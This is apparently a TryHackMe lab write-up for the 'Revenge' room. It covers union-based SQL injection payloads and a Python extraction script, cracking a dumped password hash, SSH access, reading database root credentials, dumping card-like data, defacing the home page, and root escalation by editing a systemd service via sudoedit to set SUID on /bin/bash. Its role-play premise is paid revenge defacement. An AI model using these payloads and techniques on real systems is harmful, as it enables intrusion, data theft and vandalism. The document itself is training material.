# Revenge

## Introduction

Welcome to my another writeup! In this TryHackMe [Revenge](https://tryhackme.com/room/revenge) room, you'll learn: Union-Based SQL injection, `sudoedit` privilege escalation and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

> You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

### Task 1 - Message from Billy Joel

Billy Joel has sent you a message regarding your mission. Download it, read it and continue on.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# cat qTyAhRp.txt     
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
```

### Task 2 - Revenge!

This is revenge! You've been hired by Billy Joel to break into and deface the **Rubber Ducky Inc.** webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# export RHOSTS=10.10.151.170
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7253b77aebab22701cf73c7ac776d989 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBiHOfDlVoYCp0+/LM7BhujeUicHQ+HwAidwcp1yMZE3j6K/7RW3XsNSEyUR8RpVaXAHl7ThNfD2pmzGPBV9uOjNlgNuzhASOgQuz9G4hQyLh5u1Sv9QR8R9udClyRoqUwGBfdNKjqAK2Kw7OghAHXlwUxniYRLUeAD60oLjm4uIv+1QlA2t5/LL6utV2ePWOEHe8WehXPGrstJtJ8Jf/uM48s0jhLhMEewzSqR2w0LWAGDFzOdfnOvcyQtJ9FeswJRG7fWXXsOms0Fp4lhTL4fknL+PSdWEPagTjRfUIRxskkFsaxI//3EulETC+gSa+KilVRfiKAGTdrdz7RL5sl
|   256 437700fbda42025852127dcd4e524fc3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNoSioP7IDDu4yIVfGnhLoMTyvBuzxILnRr7rKGX0YpNShJfHLjEQRIdUoYq+/7P0wBjLoXn9g7XpLLb7UMvm4=
|   256 2b57137cc84f1dc26867283f8e3930ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEpROzuQcffRwKXCOz+JQ5p7QKnAQVEDUwwUkkblavyh
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | nginx 1.14.0 (Ubuntu)

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:** (Optional, but it's a good practice to do so.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# echo "$RHOSTS revenge.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227011119.png)

**Products page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227011556.png)

**Contact page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227011615.png)

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227011623.png)

**Let's enumerate hidden directories and files via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# gobuster dir -u http://revenge.thm/ -w /usr/share/wordlists/dirb/big.txt -t 40 -x txt,bak
[...]
/admin                (Status: 200) [Size: 4983]
/contact              (Status: 200) [Size: 6906]
/index                (Status: 200) [Size: 8541]
/login                (Status: 200) [Size: 4980]
/products             (Status: 200) [Size: 7254]
/requirements.txt     (Status: 200) [Size: 258]
/static               (Status: 301) [Size: 194] [--> http://revenge.thm/static/]
```

- Found hidden directory and file: `/admin`, `/requirements.txt`

**Let's take a look at the login page:**
```html
<form class="col s4 offset-s4" action="#">
    <div class="row">
        <span class="light col s12">Enter your login information</span>
        <div class="input-field col s12">

            <input id="username" type="text" class="validate" required>
            <label for="Username">Username</label>
        </div>
        <div class="input-field col s12">
            <input id="password" type="password" class="validate" required>
            <label for="password">Password</label>
        </div>
    </div>
    <button class="btn waves-effect waves-light col s12 deep-orange darken-1" type="submit"
        name="action">Login
        <i class="material-icons right">send</i>
    </button>
</form>
```

**Try to login?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012041.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012107.png)

When I clicked the `Login` button, it'll send a GET request to `/login` with parameter `action`, which sounds useless...

**How about the `/admin` page that we found in `gobuster`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012248.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012256.png)

Same.

Looks like login pages are not our target.

**Contact page?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012514.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012531.png)

When I clicked the `Submit` button, it'll send a POST request to `/contact`, with parameter `action`.

**Then forward the request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227012633.png)

`Someone will be in touch shortly.`. Hmm... Maybe we can exploit XSS(Cross-Site Scripting), then steal that guy's cookies?

**How about the `requirements.txt`?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# curl http://revenge.thm/requirements.txt   
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

We can see that this web application back-end is using **Flask**, template engine **Jinja2**, WSGI (Web Server Gateway Interface) **Werkzeug**, DBMS (Database Management System) **MySQL**.

That's a lot of information disclosures!

**Let's go back to the products page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227013425.png)

In here, we can view 4 products.

**Let's click the first one:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227013534.png)

As you can see, it brings us to `/products/1`.

**Hmm... What if I go to `products/0`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227013632.png)

HTTP status `500 Internal Server Error`.

Interesting.

## Initial Foothold

Armed with above information, **it looks like the products page is using SQL query to fetch product details**.

**For example, if we want to view product 1, the SQL query will be:**
```sql
SELECT * FROM product WHERE productId = 1;
```

**Let's test for SQL injection:**
```sql
1 AND 1-- -
```

This will always be evaluated as True, because 1 is equal to 1.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227014239.png)

No error.

**What if it evaluates as False?**
```sql
1 AND 0-- -
```

This will always be evaluated as False, because 1 is NOT equal to 0.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227014336.png)

We triggered an error.

Hmm... **Looks like it's vulnerable to SQL injection.**

But which type of SQL injection? Blind-Based? UNION-Based?

Let's find out.

After some trial and errror, **I found that it's vulnerable to UNION-Based SQL injection.**

```sql
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227015528.png)

**When I change the fifth or sixth column to a NULL value, it returns status 500:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227015618.png)

So it's clear that **the fifth and sixth column doesn't accept NULL value.**

**The product table looks like this in MySQL:**
```sql
CREATE TABLE product(
header VARCHAR(255),
image VARCHAR(255),
description VARCHAR(255),
color VARCHAR(255),
unknown_column1 VARCHAR(255) NOT NULL,
unknown_column2 VARCHAR(255) NOT NULL,
price int
);
```

The `NOT NULL` means that column doesn't accept NULL value.

> Note to myself: If you found a SQL injection vulnerability but couldn't enumerate how many columns are there, **try to use different data types**, like string and integer, it may returns different result.

After we found there are 8 columns in the current table, **we need to find which column is/are accepting string data type:**

```sql
0 UNION ALL SELECT 'string1','string2','string3','string4',1,1,'string5','string6'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227020435.png)

Hmm... We can use the second, thrid, and the eighth column, **as they accept string data type and displayed out to us.**

**Then, can now enumerate the database schema(structure)!**

In the `requirements.txt`, we know that **the web application is using MySQL as the DBMS(Database Management System).**

**Let's confirm that:** ([MySQL SQL Injection cheat sheet from pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet))
```sql
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,@@version-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227021004.png)

Yep. **MySQL version 5.7.31-0ubuntu0.18.04.1.**

**Next, I wanna know which database I'm current in:**
```sql
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,database()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227021157.png)

- Current database: `duckyinc`

**Listing tables:**
```sql
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,table_name FROM information_schema.tables-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227021645.png)

**Hmm... Only 1 result. Let's use the `LIMIT` clause. Also, we're only interested in database `duckyinc`, so let's use the `WHERE` clause:**
```sql
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,table_name FROM information_schema.tables WHERE table_schema='duckyinc' LIMIT 1 OFFSET 0-- -
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,table_name FROM information_schema.tables WHERE table_schema='duckyinc' LIMIT 1 OFFSET 1-- -
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,table_name FROM information_schema.tables WHERE table_schema='duckyinc' LIMIT 1 OFFSET 2-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227022053.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227022123.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Revenge/images/Pasted%20image%2020221227022155.png)

- Database `duckyinc` tables: `product`, `system_user`, `user`

Hmm... Table `system_user` sounds very interesting. **Maybe it holds some SSH credentials?**

**Listing columns in database `duckyinc`'s table `system_user`:**
```sql
0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,column_name FROM information_schema.columns WHERE table_name='system_user' LIMIT 1 OFFSET 0-- -
```

**Also, I wanna write a python script to automate that:**
```py
#!/usr/bin/env python3
import requests
import urllib.parse
from bs4 import BeautifulSoup

def main():
    url = 'http://revenge.thm/products/'
    position = 0

    while True:
        payload = f"""0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,column_name FROM information_schema.columns WHERE table_name='system_user' LIMIT 1 OFFSET {position}-- -"""
        finalPayload = url + urllib.parse.quote(payload)

        request = requests.get(finalPayload)

        if request.status_code == 500:
            print(f'[-] Payload failed: {payload}')
            exit()
        else:
            position += 1
            soup = BeautifulSoup(request.text, 'html.parser')
            result = soup.p.text

            print(result)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# python3 enum_database.py
id
username
_password
email
[-] Payload failed: 0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,column_name FROM information_schema.columns WHERE table_name='system_user' LIMIT 1 OFFSET 4-- -
```

- Database `duckyinc`'s table `system_user` columns: `id`, `username`, `_password`, `email`

**Let's extract all data from table `system_user`!**
```py
payload = f"""0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,CONCAT(id,':',username,':',_password,':',email) FROM system_user LIMIT 1 OFFSET {position}-- -"""
```

> Note: The `CONCAT()` is the string concatenation. You can display multiple columns' data in a single column.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# python3 enum_database.py
1:server-admin:$2a$08${Redacted}:sadmin@duckyinc.org
2:kmotley:$2a$12${Redacted}:kmotley@duckyinc.org
3:dhughes:$2a$12${Redacted}:dhughes@duckyinc.org
[-] Payload failed: 0 UNION ALL SELECT NULL,NULL,NULL,NULL,1,1,NULL,CONCAT(id,':',username,':',_password,':',email) FROM system_user LIMIT 1 OFFSET 3-- -
```

**Nice! Let's crack those hashes!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt server-admin.txt            
[...]
{Redacted}         (server-admin)     
```

Hmm... I can only cracked `server-admin`'s hash.

**Let's use that password to SSH into the target machine!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Revenge]
└─# ssh server-admin@$RHOSTS
[...]
server-admin@10.10.151.170's password:
[...]
################################################################################
#			 Ducky Inc. Web Server 00080012			       #
#	     This server is for authorized Ducky Inc. employees only	       #
#		   All actiions are being monitored and recorded	       #
#		     IP and MAC addresses have been logged		       #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$ whoami;hostname;id;ip a
server-admin
duckyinc
uid=1001(server-admin) gid=1001(server-admin) groups=1001(server-admin),33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:90:cb:86:fd:07 brd ff:ff:ff:ff:ff:ff
    inet 10.10.151.170/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2508sec preferred_lft 2508sec
    inet6 fe80::90:cbff:fe86:fd07/64 scope link 
       valid_lft forever preferred_lft forever
```

Nice!!! I'm user `server-admin`!

**`flag2.txt`:**
```
server-admin@duckyinc:~$ cat flag2.txt 
thm{Redacted}
```

**Hmm... Looks like the flag 1 is in the database?**

**After some basic enumerations, I found MySQL root credentials in `/var/www/duckyinc/app.py`, which is the Flask python app:**  
```
server-admin@duckyinc:~$ cat /var/www/duckyinc/app.py 
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:{Redacted}@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:{Redacted}@localhost/duckyinc')
```

**Let's use that credentials to find the flag 1:**
```
server-admin@duckyinc:~$ mysql -uroot -p{Redacted}
[...]
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| duckyinc           |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

mysql> use duckyinc;

mysql> show tables;
+--------------------+
| Tables_in_duckyinc |
+--------------------+
| product            |
| system_user        |
| user               |
+--------------------+

mysql> SELECT * FROM user;
+----+----------+--------------------------------------------------------------+----------------------------+---------------------------------+------------------+
| id | username | _password                                                    | credit_card                | email                           | company          |
+----+----------+--------------------------------------------------------------+----------------------------+---------------------------------+------------------+
|  1 | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           | sales@fakeinc.org               | Fake Inc         |
|  2 | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            | accountspayable@ecorp.org       | Evil Corp        |
|  3 | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            | accounts.payable@mcdoonalds.org | McDoonalds Inc   |
|  4 | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           | sales@ABC.com                   | ABC Corp         |
|  5 | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           | sales@threebelow.com            | Three Below      |
|  6 | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{Redacted}              | ap@krasco.org                   | Krasco Org       |
|  7 | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           | payable@wallyworld.com          | Wally World Corp |
|  8 | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           | payables@orlando.gov            | Orlando City     |
|  9 | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            | sales@dollatwee.com             | Dolla Twee       |
| 10 | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            | sales@ofamdollar                | O!  Fam Dollar   |
+----+----------+--------------------------------------------------------------+----------------------------+---------------------------------+------------------+
```

Found it!

**In the mission objectives, we need to deface the website:**

> "What I want you to do is simple. Break into the server that's running the website and deface the front page."

**Let's do it!**
```
server-admin@duckyinc:~$ nano /var/www/duckyinc/templates/index.html
```

## Privilege Escalation

### server-admin to root

Let's do some enumerations!

**Sudo permission:**
```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl
        restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
```

Looks like we can run `/bin/systemctl` on some services as root?

**I also found something weird in `/opt`:**
```
server-admin@duckyinc:~$ ls -lah /opt
total 36K
drwxr-xr-x  3 root root 4.0K Aug 20  2020 .
drwxr-xr-x 24 root root 4.0K Aug  9  2020 ..
drwxr-xr-x 11 root root 4.0K Aug 12  2020 Bashfuscator
-rw-r--r--  1 root root  21K Aug 20  2020 mangled.sh
```

Bashfuscator. Hmm...

Let's dig deeper into the sudo permission!

**We can run the following command as root:**
```sh
/bin/systemctl start duckyinc.service
/bin/systemctl enable duckyinc.service
/bin/systemctl restart duckyinc.service
/bin/systemctl daemon-reload
sudoedit /etc/systemd/system/duckyinc.service
```

The `sudoedit`, and `/bin/systemctl restart duckyinc.service` looks interesting.

**Let's try to edit the `duckyinc.service` config file:**
```
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
```

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m $
ExecReload=/bin/kill -s HUP $MAINPID                      
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

**Hmm... How about I set the `User` and `Group` to `root`, and add a SUID sticky bit to `/bin/bash`?**
```
[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/chmod +s /bin/bash
```

**Then restart the service:**
```
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
server-admin@duckyinc:~$ sudo /bin/systemctl start duckyinc.service
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service

server-admin@duckyinc:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

**Nice! We now can become `root` via `/bin/bash -p` to use the SUID privilege:**
```
server-admin@duckyinc:~$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
duckyinc
uid=1001(server-admin) gid=1001(server-admin) euid=0(root) egid=0(root) groups=0(root),33(www-data),1001(server-admin)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:90:cb:86:fd:07 brd ff:ff:ff:ff:ff:ff
    inet 10.10.151.170/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2903sec preferred_lft 2903sec
    inet6 fe80::90:cbff:fe86:fd07/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**`flag3.txt`:**
```
bash-4.4# cat /root/flag3.txt
thm{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating Web Application's Hidden Directories and Files
2. Information Disclosures in Web Application's Back-end Details
3. Exploiting UNION-Based SQL Injection
4. Cracking Hashes
5. Vertical Privilege Escalation via Editing Service Configuration